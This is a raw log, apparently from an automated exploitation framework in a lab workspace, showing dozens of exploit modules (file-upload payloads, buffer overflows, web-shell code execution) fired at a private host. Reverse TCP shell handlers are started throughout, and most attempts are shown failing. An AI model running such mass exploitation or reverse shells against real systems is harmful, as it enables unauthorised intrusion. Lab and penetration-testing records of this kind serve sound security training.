[-] [2016.06.04-10:08:51] [0644] Server returned: <!DOCTYPE html><html><head><title>Apache Tomcat/8.0.14 (Debian) - Error report</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style> </head><body><h1>HTTP Status 404 - /wp-content/plugins/wp-symposium/server/php/index.php</h1><div class="line"></div><p><b>type</b> Status report</p><p><b>message</b> <u>/wp-content/plugins/wp-symposium/server/php/index.php</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><hr class="line"><h3>Apache Tomcat/8.0.14 (Debian)</h3></body></html>
[-] [2016.06.04-10:08:51] [0644] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[+] [2016.06.04-10:08:52] Workspace:lab5 Progress:649/775 (83%) [645/770] 10.198.0.1:8080 - ManageEngine Multiple Products Authenticated File Upload
[*] [2016.06.04-10:08:52] [0645] Started reverse TCP handler on 0.0.0.0:1433
[*] [2016.06.04-10:08:52] [0645] Selecting target...
[*] [2016.06.04-10:08:52] [0645] Selected target ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1
[-] [2016.06.04-10:08:52] [0645] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Failed to authenticate
[+] [2016.06.04-10:08:53] Workspace:lab5 Progress:650/775 (83%) [646/770] 10.198.0.1:8080 - WordPress WP EasyCart Unrestricted File Upload
[*] [2016.06.04-10:08:53] [0646] Started reverse TCP handler on 0.0.0.0:1434
[*] [2016.06.04-10:08:53] [0646] EC authentication attack is enabled
[*] [2016.06.04-10:08:53] [0646] Preparing payload...
[*] [2016.06.04-10:08:53] [0646] Uploading payload to /wp-content/plugins/wp-easycart/products/banners/laldXIFwwa_218af840725f96cd65d5da8e58af9cd5.php
[-] [2016.06.04-10:08:53] [0646] Server responded with status code 404
[*] [2016.06.04-10:08:53] [0646] Executing the payload...
[-] [2016.06.04-10:08:53] [0646] Failed to upload the payload
[!] [2016.06.04-10:08:55] [0646] This exploit may require manual cleanup of 'laldXIFwwa_218af840725f96cd65d5da8e58af9cd5.php' on the target
[+] [2016.06.04-10:08:56] Workspace:lab5 Progress:651/775 (84%) [647/770] 10.198.0.1:8080 - WordPress Pixabay Images PHP Code Upload
[*] [2016.06.04-10:08:56] [0647] Started reverse TCP handler on 0.0.0.0:1435
[-] [2016.06.04-10:08:56] [0647] Exploit aborted due to failure: no-target: 10.198.0.1:8080 - / does not seeem to be WordPress site
[+] [2016.06.04-10:08:56] Workspace:lab5 Progress:652/775 (84%) [648/770] 10.198.0.1:8080 - WordPress Photo Gallery Unrestricted File Upload
[+] [2016.06.04-10:08:57] Workspace:lab5 Progress:653/775 (84%) [649/770] 10.198.0.1:8080 - Wordpress InBoundio Marketing PHP Upload Vulnerability
[*] [2016.06.04-10:08:57] [0649] Started reverse TCP handler on 0.0.0.0:1438
[-] [2016.06.04-10:08:57] [0649] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-10:08:58] Workspace:lab5 Progress:654/775 (84%) [650/770] 10.198.0.1:8080 - Novell ZENworks Configuration Management Arbitrary File Upload
[*] [2016.06.04-10:08:58] [0650] Started reverse TCP handler on 0.0.0.0:1439
[*] [2016.06.04-10:08:58] [0650] Uploading WAR file to ../../../opt/novell/zenworks/share/tomcat/webapps/
[-] [2016.06.04-10:08:58] [0650] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:11:28] Workspace:lab5 Progress:655/775 (84%) [651/770] 10.198.0.1:80 - Carberp Web Panel C2 Backdoor Remote PHP Code Execution
[*] [2016.06.04-10:11:28] [0651] Started reverse TCP handler on 0.0.0.0:1440
[+] [2016.06.04-10:11:31] Workspace:lab5 Progress:656/775 (84%) [652/770] 10.198.0.1:80 - SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
[*] [2016.06.04-10:11:31] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:11:31] No reverse connect payloads available for exploit/multi/sap/sap_soap_rfc_sxpg_command_exec
[-] [2016.06.04-10:11:31] No payloads were compatible with exploit/multi/sap/sap_soap_rfc_sxpg_command_exec)
[-] [2016.06.04-10:11:31] [0652] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:11:31] Workspace:lab5 Progress:657/775 (84%) [653/770] 10.198.0.1:80 - Savant 3.1 Web Server Overflow
[-] [2016.06.04-10:11:31] [0653] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Savant\/3\.1)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:31] Workspace:lab5 Progress:658/775 (84%) [654/770] 10.198.0.1:80 - RealServer Describe Buffer Overflow
[*] [2016.06.04-10:11:32] [0654] Started reverse TCP handler on 0.0.0.0:1442
[*] [2016.06.04-10:11:32] [0654] RealServer universal exploit launched against 10.198.0.1
[*] [2016.06.04-10:11:32] [0654] Kill the master rmserver pid to prevent shell disconnect
[+] [2016.06.04-10:11:35] Workspace:lab5 Progress:659/775 (85%) [655/770] 10.198.0.1:80 - Ipswitch WhatsUp Gold 8.03 Buffer Overflow
[-] [2016.06.04-10:11:35] [0655] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:WhatsUp)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:36] Workspace:lab5 Progress:660/775 (85%) [656/770] 10.198.0.1:80 - Mercantec SoftCart CGI Overflow
[-] [2016.06.04-10:11:36] No reverse connect payloads available for exploit/bsdi/softcart/mercantec_softcart
[-] [2016.06.04-10:11:36] No payloads were compatible with exploit/bsdi/softcart/mercantec_softcart)
[-] [2016.06.04-10:11:36] [0656] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:11:36] Workspace:lab5 Progress:661/775 (85%) [657/770] 10.198.0.1:80 - EFS Easy Chat Server Authentication Request Handling Buffer Overflow
[-] [2016.06.04-10:11:37] [0657] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Easy Chat Server\/1\.0)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:37] Workspace:lab5 Progress:662/775 (85%) [658/770] 10.198.0.1:80 - BadBlue 2.5 EXT.dll Buffer Overflow
[-] [2016.06.04-10:11:43] [0658] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:BadBlue\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:43] Workspace:lab5 Progress:663/775 (85%) [659/770] 10.198.0.1:80 - MailEnable Authorization Header Buffer Overflow
[-] [2016.06.04-10:11:43] [0659] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:MailEnable)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:44] Workspace:lab5 Progress:664/775 (85%) [660/770] 10.198.0.1:80 - eDirectory 8.7.3 iMonitor Remote Stack Buffer Overflow
[-] [2016.06.04-10:11:45] [0660] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:DHost\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:45] Workspace:lab5 Progress:665/775 (85%) [661/770] 10.198.0.1:80 - Linksys WRT54 Access Point apply.cgi Buffer Overflow
[-] [2016.06.04-10:11:45] No reverse connect payloads available for exploit/linux/http/linksys_apply_cgi
[-] [2016.06.04-10:11:45] No payloads were compatible with exploit/linux/http/linksys_apply_cgi)
[-] [2016.06.04-10:11:45] [0661] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:11:45] Workspace:lab5 Progress:666/775 (85%) [662/770] 10.198.0.1:80 - Blue Coat WinProxy Host Header Overflow
[*] [2016.06.04-10:11:46] [0662] Started reverse TCP handler on 0.0.0.0:1448
[*] [2016.06.04-10:11:46] [0662] 10.198.0.1:80 - Trying target WinProxy <= 6.1 R1a Universal...
[+] [2016.06.04-10:11:49] Workspace:lab5 Progress:667/775 (86%) [663/770] 10.198.0.1:80 - Apache Module mod_rewrite LDAP Protocol Buffer Overflow
[-] [2016.06.04-10:11:49] [0663] Exploit failed: No encoders encoded the buffer successfully.
[+] [2016.06.04-10:11:49] Workspace:lab5 Progress:668/775 (86%) [664/770] 10.198.0.1:80 - NaviCOPA 2.0.1 URL Handling Buffer Overflow
[*] [2016.06.04-10:11:50] [0664] Started reverse TCP handler on 0.0.0.0:1450
[*] [2016.06.04-10:11:50] [0664] 10.198.0.1:80 - Trying target NaviCOPA 2.0.1 Universal
[+] [2016.06.04-10:11:53] Workspace:lab5 Progress:669/775 (86%) [665/770] 10.198.0.1:80 - Apache mod_jk 1.2.20 Buffer Overflow
[*] [2016.06.04-10:11:53] [0665] Started reverse TCP handler on 0.0.0.0:1451
[*] [2016.06.04-10:11:53] [0665] 10.198.0.1:80 - Trying target mod_jk 1.2.20 (Apache 1.3.x/2.0.x/2.2.x) (any win32 OS/language)...
[-] [2016.06.04-10:11:53] [0665] 10.198.0.1:80 - The exploit failed : HTTP Status Code '403 Forbidden' received :-(
[+] [2016.06.04-10:11:56] Workspace:lab5 Progress:670/775 (86%) [666/770] 10.198.0.1:80 - SAP DB 7.4 WebTools Buffer Overflow
[-] [2016.06.04-10:11:56] [0666] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:SAP-Internet-SapDb-Server\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:11:57] Workspace:lab5 Progress:671/775 (86%) [667/770] 10.198.0.1:80 - HP OpenView Network Node Manager OpenView5.exe CGI Buffer Overflow
[*] [2016.06.04-10:11:57] [0667] Started reverse TCP handler on 0.0.0.0:1453
[*] [2016.06.04-10:11:57] [0667] 10.198.0.1:80 - Trying target HP OpenView Network Node Manager 7.50 / Windows 2000 All...
[+] [2016.06.04-10:11:59] Workspace:lab5 Progress:672/775 (86%) [668/770] 10.198.0.1:80 - BadBlue 2.72b PassThru Buffer Overflow
[-] [2016.06.04-10:12:05] [0668] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:BadBlue\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:06] Workspace:lab5 Progress:673/775 (86%) [669/770] 10.198.0.1:80 - HP OpenView Network Node Manager Toolbar.exe CGI Buffer Overflow
[*] [2016.06.04-10:12:06] [0669] Started reverse TCP handler on 0.0.0.0:1455
[*] [2016.06.04-10:12:06] [0669] Trying target HP OpenView Network Node Manager 7.50 / Windows 2000 All...
[+] [2016.06.04-10:12:09] Workspace:lab5 Progress:674/775 (86%) [670/770] 10.198.0.1:80 - Oracle Weblogic Apache Connector POST Request Buffer Overflow
[+] [2016.06.04-10:12:09] Workspace:lab5 Progress:675/775 (87%) [671/770] 10.198.0.1:8080 - Savant 3.1 Web Server Overflow
[-] [2016.06.04-10:12:10] [0671] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:Savant\/3\.1)", use 'set FingerprintCheck false' to disable this check.
[*] [2016.06.04-10:12:10] [0670] Started reverse TCP handler on 0.0.0.0:1456
[-] [2016.06.04-10:12:10] [0670] BEA mod_weblogic not supported
[+] [2016.06.04-10:12:10] Workspace:lab5 Progress:676/775 (87%) [672/770] 10.198.0.1:8080 - RealServer Describe Buffer Overflow
[*] [2016.06.04-10:12:11] [0672] Started reverse TCP handler on 0.0.0.0:1458
[*] [2016.06.04-10:12:11] [0672] RealServer universal exploit launched against 10.198.0.1
[*] [2016.06.04-10:12:11] [0672] Kill the master rmserver pid to prevent shell disconnect
[+] [2016.06.04-10:12:13] Workspace:lab5 Progress:677/775 (87%) [673/770] 10.198.0.1:80 - BEA Weblogic Transfer-Encoding Buffer Overflow
[*] [2016.06.04-10:12:13] [0673] Started reverse TCP handler on 0.0.0.0:1459
[+] [2016.06.04-10:12:13] Workspace:lab5 Progress:678/775 (87%) [674/770] 10.198.0.1:8080 - Oracle 9i XDB HTTP PASS Overflow (win32)
[*] [2016.06.04-10:12:14] [0674] Started reverse TCP handler on 0.0.0.0:1460
[*] [2016.06.04-10:12:14] [0674] 10.198.0.1:8080 - Trying target Oracle 9.2.0.1 Universal...
[+] [2016.06.04-10:12:16] Workspace:lab5 Progress:679/775 (87%) [675/770] 10.198.0.1:80 - Free Download Manager Remote Control Server Buffer Overflow
[-] [2016.06.04-10:12:16] [0675] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?i-mx:(FDM Remote control server|Free Download Manager))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:16] Workspace:lab5 Progress:680/775 (87%) [676/770] 10.198.0.1:80 - HTTPDX h_handlepeer() Function Buffer Overflow
[+] [2016.06.04-10:12:17] Workspace:lab5 Progress:681/775 (87%) [677/770] 10.198.0.1:8080 - Ipswitch WhatsUp Gold 8.03 Buffer Overflow
[-] [2016.06.04-10:12:17] [0676] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:httpdx\/.* \(Win32\))", use 'set FingerprintCheck false' to disable this check.
[-] [2016.06.04-10:12:17] [0677] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:WhatsUp)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:18] Workspace:lab5 Progress:682/775 (88%) [678/770] 10.198.0.1:80 - HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
[+] [2016.06.04-10:12:19] Workspace:lab5 Progress:683/775 (88%) [679/770] 10.198.0.1:8080 - Mercantec SoftCart CGI Overflow
[*] [2016.06.04-10:12:19] [0678] Started reverse TCP handler on 0.0.0.0:1464
[-] [2016.06.04-10:12:19] No reverse connect payloads available for exploit/bsdi/softcart/mercantec_softcart
[-] [2016.06.04-10:12:19] No payloads were compatible with exploit/bsdi/softcart/mercantec_softcart)
[-] [2016.06.04-10:12:19] [0679] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:12:19] [0678] Trying target HP OpenView Network Node Manager 7.50 / Windows 2000 All...
[+] [2016.06.04-10:12:19] Workspace:lab5 Progress:684/775 (88%) [680/770] 10.198.0.1:8080 - EFS Easy Chat Server Authentication Request Handling Buffer Overflow
[-] [2016.06.04-10:12:19] [0680] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:Easy Chat Server\/1\.0)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:20] Workspace:lab5 Progress:685/775 (88%) [681/770] 10.198.0.1:8080 - Carberp Web Panel C2 Backdoor Remote PHP Code Execution
[*] [2016.06.04-10:12:20] [0681] Started reverse TCP handler on 0.0.0.0:1466
[+] [2016.06.04-10:12:22] Workspace:lab5 Progress:686/775 (88%) [682/770] 10.198.0.1:80 - Open Flash Chart v2 Arbitrary File Upload
[*] [2016.06.04-10:12:22] [0682] Started reverse TCP handler on 0.0.0.0:1467
[*] [2016.06.04-10:12:22] [0682] Uploading 'oOfLN2P.php' (1285 bytes)...
[-] [2016.06.04-10:12:22] [0682] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:80 - File wasn't uploaded, aborting!
[+] [2016.06.04-10:12:22] Workspace:lab5 Progress:687/775 (88%) [683/770] 10.198.0.1:80 - HP OpenView Network Node Manager OvWebHelp.exe CGI Buffer Overflow
[*] [2016.06.04-10:12:23] [0683] Started reverse TCP handler on 0.0.0.0:1468
[*] [2016.06.04-10:12:23] [0683] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:12:23] Workspace:lab5 Progress:688/775 (88%) [684/770] 10.198.0.1:8080 - SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
[*] [2016.06.04-10:12:23] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:12:23] No reverse connect payloads available for exploit/multi/sap/sap_soap_rfc_sxpg_command_exec
[-] [2016.06.04-10:12:23] No payloads were compatible with exploit/multi/sap/sap_soap_rfc_sxpg_command_exec)
[-] [2016.06.04-10:12:24] [0684] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:12:24] Workspace:lab5 Progress:689/775 (88%) [685/770] 10.198.0.1:8080 - BadBlue 2.5 EXT.dll Buffer Overflow
[+] [2016.06.04-10:12:26] Workspace:lab5 Progress:690/775 (89%) [686/770] 10.198.0.1:80 - HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow
[-] [2016.06.04-10:12:26] [0686] Exploit failed: No encoders encoded the buffer successfully.
[+] [2016.06.04-10:12:27] Workspace:lab5 Progress:691/775 (89%) [687/770] 10.198.0.1:80 - HTTPDX tolog() Function Format String Vulnerability
[*] [2016.06.04-10:12:27] [0687] Started reverse TCP handler on 0.0.0.0:1471
[*] [2016.06.04-10:12:27] [0687] Automatically detecting the target...
[-] [2016.06.04-10:12:27] [0687] Exploit aborted due to failure: unknown: The server doesn't appear to be running a vulnerable version of HTTPDX
[+] [2016.06.04-10:12:27] Workspace:lab5 Progress:692/775 (89%) [688/770] 10.198.0.1:80 - InterSystems Cache UtilConfigHome.csp Argument Buffer Overflow
[*] [2016.06.04-10:12:28] [0688] Started reverse TCP handler on 0.0.0.0:1472
[*] [2016.06.04-10:12:28] [0688] Trying target Windows 2000 SP4 English...
[+] [2016.06.04-10:12:31] Workspace:lab5 Progress:693/775 (89%) [689/770] 10.198.0.1:80 - Sun Java System Web Server WebDAV OPTIONS Buffer Overflow
[*] [2016.06.04-10:12:31] [0689] Started reverse TCP handler on 0.0.0.0:1473
[+] [2016.06.04-10:12:34] Workspace:lab5 Progress:694/775 (89%) [690/770] 10.198.0.1:80 - HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
[*] [2016.06.04-10:12:34] [0690] Started reverse TCP handler on 0.0.0.0:1474
[*] [2016.06.04-10:12:34] [0690] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:12:34] [0690] Sending exploit via GET request (ins=load)...
[-] [2016.06.04-10:12:35] [0690] Eek! We weren't expecting a response, but we got one
[+] [2016.06.04-10:12:42] Workspace:lab5 Progress:695/775 (89%) [691/770] 10.198.0.1:80 - HP OpenView Network Node Manager getnnmdata.exe (MaxAge) CGI Buffer Overflow
[*] [2016.06.04-10:12:42] [0691] Started reverse TCP handler on 0.0.0.0:1475
[*] [2016.06.04-10:12:42] [0691] Trying target HP OpenView Network Node Manager 7.50...
[-] [2016.06.04-10:12:45] [0685] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:BadBlue\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:45] Workspace:lab5 Progress:696/775 (89%) [692/770] 10.198.0.1:8080 - MailEnable Authorization Header Buffer Overflow
[+] [2016.06.04-10:12:45] Workspace:lab5 Progress:697/775 (89%) [693/770] 10.198.0.1:80 - HP OpenView Network Node Manager getnnmdata.exe (ICount) CGI Buffer Overflow
[*] [2016.06.04-10:12:46] [0693] Started reverse TCP handler on 0.0.0.0:1477
[*] [2016.06.04-10:12:46] [0693] Trying target HP OpenView Network Node Manager 7.50...
[-] [2016.06.04-10:12:46] [0692] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:MailEnable)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:46] Workspace:lab5 Progress:698/775 (90%) [694/770] 10.198.0.1:8080 - eDirectory 8.7.3 iMonitor Remote Stack Buffer Overflow
[-] [2016.06.04-10:12:47] [0694] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:DHost\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:48] Workspace:lab5 Progress:699/775 (90%) [695/770] 10.198.0.1:8080 - Linksys WRT54 Access Point apply.cgi Buffer Overflow
[-] [2016.06.04-10:12:48] No reverse connect payloads available for exploit/linux/http/linksys_apply_cgi
[-] [2016.06.04-10:12:48] No payloads were compatible with exploit/linux/http/linksys_apply_cgi)
[-] [2016.06.04-10:12:48] [0695] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:12:48] Workspace:lab5 Progress:700/775 (90%) [696/770] 10.198.0.1:8080 - Apache Module mod_rewrite LDAP Protocol Buffer Overflow
[-] [2016.06.04-10:12:48] [0696] Exploit failed: No encoders encoded the buffer successfully.
[+] [2016.06.04-10:12:48] Workspace:lab5 Progress:701/775 (90%) [697/770] 10.198.0.1:8080 - SAP DB 7.4 WebTools Buffer Overflow
[-] [2016.06.04-10:12:49] [0697] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:SAP-Internet-SapDb-Server\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:49] Workspace:lab5 Progress:702/775 (90%) [698/770] 10.198.0.1:80 - HP OpenView Network Node Manager getnnmdata.exe (Hostname) CGI Buffer Overflow
[*] [2016.06.04-10:12:49] [0698] Started reverse TCP handler on 0.0.0.0:1481
[*] [2016.06.04-10:12:49] [0698] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:12:49] Workspace:lab5 Progress:703/775 (90%) [699/770] 10.198.0.1:8080 - BadBlue 2.72b PassThru Buffer Overflow
[+] [2016.06.04-10:12:53] Workspace:lab5 Progress:704/775 (90%) [700/770] 10.198.0.1:80 - HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
[*] [2016.06.04-10:12:53] [0700] Started reverse TCP handler on 0.0.0.0:1483
[*] [2016.06.04-10:12:53] [0700] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01206...
[-] [2016.06.04-10:12:53] [0700] Eek! We weren't expecting a response, but we got one
[+] [2016.06.04-10:12:56] Workspace:lab5 Progress:705/775 (90%) [701/770] 10.198.0.1:80 - HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
[*] [2016.06.04-10:12:56] [0701] Started reverse TCP handler on 0.0.0.0:1484
[*] [2016.06.04-10:12:56] [0701] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:12:56] [0701] Sending exploit via GET request...
[-] [2016.06.04-10:12:56] [0701] Exploit aborted due to failure: unknown: Eek, exploit likely failed. The body didn't contain what we expected.
[+] [2016.06.04-10:12:56] Workspace:lab5 Progress:706/775 (91%) [702/770] 10.198.0.1:80 - HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
[*] [2016.06.04-10:12:56] [0702] Started reverse TCP handler on 0.0.0.0:1485
[*] [2016.06.04-10:12:56] [0702] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:12:57] [0702] Sending exploit via GET request...
[-] [2016.06.04-10:12:57] [0702] Exploit aborted due to failure: unknown: Eek, exploit likely failed. The body didn't contain what we expected.
[+] [2016.06.04-10:12:57] Workspace:lab5 Progress:707/775 (91%) [703/770] 10.198.0.1:80 - EasyFTP Server list.html path Stack Buffer Overflow
[-] [2016.06.04-10:12:57] [0703] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Easy-Web Server\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:12:57] Workspace:lab5 Progress:708/775 (91%) [704/770] 10.198.0.1:80 - Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow
[*] [2016.06.04-10:12:58] [0704] Started reverse TCP handler on 0.0.0.0:1487
[*] [2016.06.04-10:12:58] [0704] Automatically detecting the target...
[-] [2016.06.04-10:12:58] [0704] Exploit aborted due to failure: no-target: Unable to automatically detect the target version
[+] [2016.06.04-10:12:58] Workspace:lab5 Progress:709/775 (91%) [705/770] 10.198.0.1:80 - Oracle Forms and Reports Remote Code Execution
[*] [2016.06.04-10:12:58] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:12:59] [0705] Started reverse TCP handler on 0.0.0.0:1488
[*] [2016.06.04-10:12:59] [0705] Querying showenv!
[-] [2016.06.04-10:12:59] [0705] Exploit aborted due to failure: unknown: 10.198.0.1:80 - target is not vulnerable or unreachable
[+] [2016.06.04-10:12:59] Workspace:lab5 Progress:710/775 (91%) [706/770] 10.198.0.1:80 - NFR Agent FSFUI Record File Upload RCE
[*] [2016.06.04-10:12:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:13:00] [0706] Started reverse TCP handler on 0.0.0.0:1490
[*] [2016.06.04-10:13:00] [0706] Encoding payload into VBS...
[*] [2016.06.04-10:13:01] [0706] Generating VBS file...
[*] [2016.06.04-10:13:01] [0706] Uploading the VBS file
[-] [2016.06.04-10:13:01] [0706] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:13:01] Workspace:lab5 Progress:711/775 (91%) [707/770] 10.198.0.1:80 - Nagios3 history.cgi Host Command Execution
[*] [2016.06.04-10:13:01] [0707] Started reverse TCP handler on 0.0.0.0:1491
[*] [2016.06.04-10:13:02] [0707] Automatically detecting the target...
[-] [2016.06.04-10:13:02] [0707] Exploit aborted due to failure: no-target: No matching target
[+] [2016.06.04-10:13:03] Workspace:lab5 Progress:712/775 (91%) [708/770] 10.198.0.1:80 - OpenPLI Webif Arbitrary Command Execution
[-] [2016.06.04-10:13:03] No reverse connect payloads available for exploit/linux/http/dreambox_openpli_shell
[-] [2016.06.04-10:13:03] No payloads were compatible with exploit/linux/http/dreambox_openpli_shell)
[-] [2016.06.04-10:13:03] [0708] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:13:03] Workspace:lab5 Progress:713/775 (92%) [709/770] 10.198.0.1:80 - HP Intelligent Management Center Arbitrary File Upload
[-] [2016.06.04-10:13:03] No reverse connect payloads available for exploit/windows/http/hp_imc_mibfileupload
[-] [2016.06.04-10:13:03] No payloads were compatible with exploit/windows/http/hp_imc_mibfileupload)
[-] [2016.06.04-10:13:03] [0709] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:13:04] Workspace:lab5 Progress:714/775 (92%) [710/770] 10.198.0.1:80 - Novell ZENworks Configuration Management Remote Execution
[*] [2016.06.04-10:13:04] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:13:04] [0710] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:13:04] Workspace:lab5 Progress:715/775 (92%) [711/770] 10.198.0.1:80 - v0pCr3w Web Shell Remote Code Execution
[-] [2016.06.04-10:13:04] No reverse connect payloads available for exploit/multi/http/v0pcr3w_exec
[-] [2016.06.04-10:13:04] No payloads were compatible with exploit/multi/http/v0pcr3w_exec)
[-] [2016.06.04-10:13:04] [0711] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:13:05] Workspace:lab5 Progress:716/775 (92%) [712/770] 10.198.0.1:80 - STUNSHELL Web Shell Remote PHP Code Execution
[*] [2016.06.04-10:13:05] [0712] Started reverse TCP handler on 0.0.0.0:1493
[+] [2016.06.04-10:13:08] Workspace:lab5 Progress:717/775 (92%) [713/770] 10.198.0.1:80 - STUNSHELL Web Shell Remote Code Execution
[-] [2016.06.04-10:13:08] No reverse connect payloads available for exploit/multi/http/stunshell_exec
[-] [2016.06.04-10:13:08] No payloads were compatible with exploit/multi/http/stunshell_exec)
[-] [2016.06.04-10:13:08] [0713] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:13:08] Workspace:lab5 Progress:718/775 (92%) [714/770] 10.198.0.1:80 - SAP ConfigServlet Remote Code Execution
[*] [2016.06.04-10:13:08] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:13:09] [0714] Started reverse TCP handler on 0.0.0.0:1494
[*] [2016.06.04-10:13:09] [0714] 10.198.0.1:80 - Exploiting remote system
